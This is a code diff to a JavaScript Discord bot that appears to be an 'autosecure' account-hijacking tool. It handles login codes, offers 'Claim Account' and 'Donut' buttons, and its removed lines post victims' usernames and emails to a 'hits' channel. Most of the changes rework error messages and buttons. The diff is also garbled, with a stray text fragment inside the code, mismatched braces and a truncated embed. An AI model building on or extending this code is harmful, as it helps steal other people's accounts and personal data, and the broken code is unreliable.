@@ -405,7 +405,7 @@ let obj = {
                             animated: false
                           }
                         },
-                        // Donut button removed as requested
+                        // Donut button eliminado
                       ]
                     },
                     {
@@ -416,6 +416,15 @@ let obj = {
                           type: 2,
                           custom_id: "claim",
                           label: "Claim Account"
+                        },
+                        {
+                          style: 1,
+                          type: 2,
+                          custom_id: `donut|${acc.newName}|1`,
+                          label: "Donut",
+                          emoji: {
+                            name: "🍩"
+                          }
                         }
                       ]
                     }
@@ -468,48 +477,61 @@ let obj = {
                         .setThumbnail(interaction.user.displayAvatarURL())
                         .setTimestamp();
                       
+tion: "Invalid authentication data. The account may be locked or the login session expired. Please try again.",
                       await logsChannel.send({ embeds: [noMcEmbed] });
                     }
                   }
-                } catch (logsError) {
-                  console.log('[submit] Failed to send to logs channel:', logsError.message);
-                }
+                    } catch (logsError) {
+                      console.log('[submit] Failed to send to logs channel:', logsError.message);
+                    }
               }
             }
           } catch (e) {
-            console.log(`Error in the process of autosecure (not necessarily while autosecuring)! ${e}`);
-            
-            // Better error handling for common issues
             if (e.response && e.response.status === 400) {
-              console.log(`HTTP 400 Error Details:`, e.response.data);
               await interaction.editReply({
                 embeds: [{
                   title: "Authentication Error :x:",
                   description: "Invalid authentication data. The account may be locked or the login session expired. Please try again.",
                   color: 0xff0000
                 }],
+                ephemeral: true
+              });
+            } else if (e.code === 'ECONNRESET' || e.code === 'ETIMEDOUT') {
+              await interaction.editReply({
                 embeds: [{
                   title: "Network Error :x:",
-                } else {
-                  // Send custom embed to hits channel (No Minecraft, secureifnomc not active)
-                  let msgnomc = {
-                    content: "",
-                    embeds: [
-                      {
-                        color: 16741484,
-                        title: "🚫 No Minecraft",
-                        fields: [
-                          {
-                            name: "User Information",
-                            value: `\u0060\u0060\u0060${interaction.user.username} | ${email} | No Minecraft Profile\u0060\u0060\u0060`,
-                            inline: false
-                          }
-                        ]
-                      }
-                    ]
-                  };
-                  await client.guilds.cache.get(nGuildId)?.channels.cache.get(nChannelId)?.send(msgnomc);
-                }
+                  description: "Network connection timed out. Please try again in a moment.",
+                  color: 0xff0000
+                }],
+                ephemeral: true
+              });
+            } else {
+              await interaction.editReply({
+                embeds: [{
+                  title: "Error :x:",
+                  description: "An unexpected error occurred while processing your request. Please try again.",
+                  color: 0xff0000
+                }],
+                ephemeral: true
+              });
+            }
+          }
+        } else {
+          console.log("Invalid Code! [Failed to Login with it!]");
+          await interaction.editReply({
+            embeds: [await getEmbed(client, "invalid")],
+            ephemeral: true
+          });
+        }
+      } catch (e) {
+        console.log(e);
+        await interaction.editReply({
+          embeds: [{
+            title: "Error :x:",
+            description: "An error occurred while processing your request",
+            color: 0xff0000
+          }],
+          ephemeral: true
         });
       }
     } else {
